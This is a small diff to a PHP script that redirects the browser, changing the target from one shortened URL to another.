@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: https://parg.co/b9xv"); 
+header("Location: http://jeb.li/o0pAs"); 
   
 exit; 
 ?> 
